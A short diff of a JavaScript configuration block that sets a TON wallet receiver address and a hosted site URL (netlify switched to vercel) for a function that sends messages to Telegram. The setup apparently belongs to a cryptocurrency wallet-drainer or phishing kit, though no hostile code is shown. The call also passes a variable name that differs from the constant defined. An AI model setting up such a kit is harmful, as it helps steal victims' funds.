@@ -25,5 +25,5 @@ async function sendMessageToTelegram(ton_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const ton_wallet_receiver_id = 'UQCmF4h_w4L07HwHh1UO_DJotdKw75rcf2IstvrMrHAQtA3e';
-const website_url = 'https://dream.netlify.app';
+const website_url = 'https://dream.vercel.app';
 sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
